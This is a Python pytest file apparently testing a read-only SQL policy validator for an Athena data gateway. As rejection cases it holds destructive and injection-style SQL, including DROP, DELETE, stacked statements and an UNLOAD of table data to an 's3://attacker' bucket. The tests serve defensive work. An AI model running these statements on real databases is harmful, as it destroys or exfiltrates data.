"""Adversarial tests for the sqlglot-based Athena read-only policy."""

from __future__ import annotations

import hashlib
import logging

import pytest
from sqlglot import exp

from src.gateway.query.models import AthenaDatasource
from src.gateway.query.sql_policy import (
    MAX_SQL_BYTES,
    QueryPolicyError,
    validate_athena_select,
)


def _datasource() -> AthenaDatasource:
    return AthenaDatasource(
        datasource_id="warehouse",
        tenant_id="tenant-a",
        project_id="project-a",
        name="Analytics warehouse",
        role_arn="arn:aws:iam::123456789012:role/axon-athena-project-a",
        region="us-east-1",
        catalog="AwsDataCatalog",
        database="analytics",
        workgroup="axon_read_only",
    )


def test_select_is_canonicalized_and_hashed() -> None:
    validated = validate_athena_select(
        "select order_id, total from orders where total > 10",
        _datasource(),
    )

    assert validated.sql == (
        "SELECT order_id, total FROM orders WHERE total > 10"
    )
    assert validated.sha256 == hashlib.sha256(
        validated.sql.encode("utf-8")
    ).hexdigest()
    assert validated.table_count == 1


@pytest.mark.parametrize(
    "sql",
    [
        "SELECT 1",
        "SELECT * FROM orders",
        "SELECT * FROM analytics.orders",
        'SELECT * FROM "AwsDataCatalog"."analytics"."orders"',
        (
            "WITH recent AS (SELECT * FROM analytics.orders) "
            "SELECT * FROM recent"
        ),
        "SELECT 'DELETE FROM orders' AS harmless /* DROP TABLE orders */",
    ],
)
def test_read_only_select_forms_are_allowed(sql: str) -> None:
    assert validate_athena_select(sql, _datasource()).sql


@pytest.mark.parametrize(
    "sql",
    [
        "INSERT INTO orders VALUES (1)",
        "UPDATE orders SET total = 0",
        "DELETE FROM orders",
        (
            "MERGE INTO orders target USING staged source ON target.id = "
            "source.id WHEN MATCHED THEN UPDATE SET total = source.total"
        ),
        "CREATE TABLE copied AS SELECT * FROM orders",
        "CREATE VIEW copied AS SELECT * FROM orders",
        "DROP TABLE orders",
        "ALTER TABLE orders ADD COLUMN note VARCHAR",
        "TRUNCATE TABLE orders",
        "SELECT * INTO copied FROM orders",
        "UNLOAD (SELECT * FROM orders) TO 's3://attacker/results/'",
        "CALL system.flush_metadata_cache()",
        "PREPARE query_name FROM SELECT * FROM orders",
        "EXECUTE query_name",
        "EXPLAIN ANALYZE SELECT * FROM orders",
        "SHOW TABLES",
        "DESCRIBE orders",
        "USE other_database",
    ],
)
def test_write_or_command_statements_are_rejected(sql: str) -> None:
    with pytest.raises(QueryPolicyError):
        validate_athena_select(sql, _datasource())


def test_unsupported_command_warning_does_not_log_sql_literals(
    caplog: pytest.LogCaptureFixture,
) -> None:
    secret = "TOP_SECRET_SQL_LITERAL_91f2"
    caplog.set_level(logging.WARNING, logger="sqlglot")

    with pytest.raises(QueryPolicyError):
        validate_athena_select(
            f"VACUUM orders '{secret}'",
            _datasource(),
        )

    assert caplog.records
    messages = "\n".join(record.getMessage() for record in caplog.records)
    assert "unsupported syntax" in messages
    assert secret not in messages


@pytest.mark.parametrize(
    "sql",
    [
        "SELECT 1; DELETE FROM orders",
        "SELECT 1; /* conceal the next statement */ DROP TABLE orders",
        "SELECT 1;;",
        "SELECT 1; SELECT 2",
    ],
)
def test_multiple_statement_bypasses_are_rejected(sql: str) -> None:
    with pytest.raises(QueryPolicyError, match="one SQL statement"):
        validate_athena_select(sql, _datasource())


@pytest.mark.parametrize(
    "sql",
    [
        "SELECT * FROM other_database.orders",
        "SELECT * FROM other_catalog.analytics.orders",
        "SELECT * FROM AwsDataCatalog.other_database.orders",
        (
            "SELECT * FROM orders WHERE EXISTS "
            "(SELECT 1 FROM other_database.customers)"
        ),
        (
            "WITH hidden AS (SELECT * FROM other_catalog.analytics.orders) "
            "SELECT * FROM hidden"
        ),
    ],
)
def test_cross_datasource_references_are_rejected(sql: str) -> None:
    with pytest.raises(QueryPolicyError, match="outside the datasource"):
        validate_athena_select(sql, _datasource())


@pytest.mark.parametrize(
    "sql",
    [
        "",
        " SELECT 1",
        "SELECT 1 ",
        "\tSELECT 1",
        "SELECT\x00 1",
        123,
        None,
    ],
)
def test_malformed_sql_input_is_rejected(sql: object) -> None:
    with pytest.raises(QueryPolicyError):
        validate_athena_select(sql, _datasource())


def test_oversized_sql_is_rejected_before_parsing() -> None:
    sql = "SELECT '" + ("x" * MAX_SQL_BYTES) + "'"

    with pytest.raises(QueryPolicyError, match="64 KiB"):
        validate_athena_select(sql, _datasource())


def test_unpaired_surrogate_input_is_rejected_as_policy_error() -> None:
    with pytest.raises(QueryPolicyError, match="valid UTF-8"):
        validate_athena_select("SELECT '\ud800'", _datasource())


def test_unpaired_surrogate_canonical_sql_is_rejected_as_policy_error(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    def _invalid_canonical_sql(
        *_args: object,
        **_kwargs: object,
    ) -> str:
        return "SELECT '\udfff'"

    monkeypatch.setattr(exp.Select, "sql", _invalid_canonical_sql)

    with pytest.raises(
        QueryPolicyError,
        match="canonical SQL must be valid UTF-8",
    ):
        validate_athena_select("SELECT 1", _datasource())
